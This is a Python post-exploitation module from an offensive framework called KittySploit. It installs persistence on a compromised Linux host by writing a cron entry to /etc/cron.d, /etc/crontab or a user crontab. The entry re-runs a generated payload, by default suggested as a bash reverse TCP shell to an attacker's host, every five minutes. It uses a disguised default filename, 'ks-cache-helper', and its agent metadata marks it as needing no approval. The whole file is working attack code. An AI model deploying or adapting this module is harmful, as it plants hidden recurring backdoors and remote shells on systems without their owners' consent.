#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "Cron Job Persistence",
        "description": (
            "Installs persistence via /etc/cron.d, user crontab, or /etc/crontab entry "
            "running a generated payload on a schedule."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "cron", "linux"],
        "references": ["https://attack.mitre.org/techniques/T1053/003/"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    cron_mode = OptChoice(
        "cron.d",
        "Install mode: cron.d file, user crontab, or system crontab",
        True,
        choices=["cron.d", "crontab", "system"],
    )
    cron_file = OptString(
        "ks-cache-helper",
        "Filename under /etc/cron.d/ when cron_mode=cron.d",
        False,
    )
    cron_user = OptString("root", "User field for cron.d/system or crontab -u target", False)
    interval = OptString("*/5 * * * *", "Cron schedule expression", True)
    payload_path = OptString("", "Payload module (e.g. payloads/singles/cmd/unix/bash_reverse_tcp)", True)
    target = OptChoice("Linux command", "Payload type", True, choices=["PHP", "Linux command"])
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)

    def _cron_d_path(self) -> str:
        name = self._opt(self.cron_file) or "ks-cache-helper"
        return f"/etc/cron.d/{name}"

    def check(self):
        mode = self._opt(self.cron_mode)
        if mode == "cron.d":
            path = self._cron_d_path()
            if not self._is_root() and not self._writable_target(path, "/etc/cron.d"):
                print_error("Root required to write /etc/cron.d entries")
                return False
            if not self._writable_target(path, "/etc/cron.d"):
                print_error(f"Cannot write {path}")
                return False
        elif mode == "system":
            if not self._is_root():
                print_error("Root required to modify /etc/crontab")
                return False
            if not self._is_writable("/etc/crontab"):
                print_error("/etc/crontab is not writable")
                return False
        else:
            user = self._opt(self.cron_user) or "root"
            if not self.command_exists("crontab"):
                print_error("crontab command not found")
                return False
            test = self.linux_execute(f"crontab -u {user} -l 2>/dev/null; echo ok")
            if "ok" not in (test or ""):
                print_error(f"Cannot access crontab for user {user}")
                return False
        print_success("Cron persistence target appears usable")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        encoded = self._generate_payload()
        schedule = self._opt(self.interval)
        user = self._opt(self.cron_user) or "root"
        mode = self._opt(self.cron_mode)
        escaped = self._runtime_command(encoded).replace("\\", "\\\\").replace('"', '\\"')
        cron_line = f'{schedule} {user} /bin/sh -c "{escaped}" # ks-cache\n'

        if mode == "cron.d":
            path = self._cron_d_path()
            self._maybe_backup(path, "cron_d")
            content = "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n"
            content += cron_line
            print_status(f"Writing {path}")
            if not self._write_remote_file(path, content, mode="0644"):
                raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {path}")
        elif mode == "system":
            self._maybe_backup("/etc/crontab", "crontab")
            print_status("Appending to /etc/crontab")
            if not self._append_remote_line("/etc/crontab", cron_line.strip()):
                raise ProcedureError(FailureType.PayloadFailed, "Cannot append to /etc/crontab")
        else:
            print_status(f"Installing crontab for user {user}")
            existing = self.linux_execute(f"crontab -u {user} -l 2>/dev/null") or ""
            if "ks-cache" in existing:
                print_warning("Existing ks-cache crontab entry detected; appending anyway")
            new_crontab = existing.rstrip("\n") + "\n" + cron_line
            if not self._write_remote_file("/tmp/.ks-crontab", new_crontab, mode="0600"):
                raise ProcedureError(FailureType.PayloadFailed, "Cannot stage crontab file")
            self.linux_execute(f"crontab -u {user} /tmp/.ks-crontab && rm -f /tmp/.ks-crontab")

        print_good("Cron persistence installed.")
        print_status(f"Schedule: {schedule} (mode={mode})")
        return True
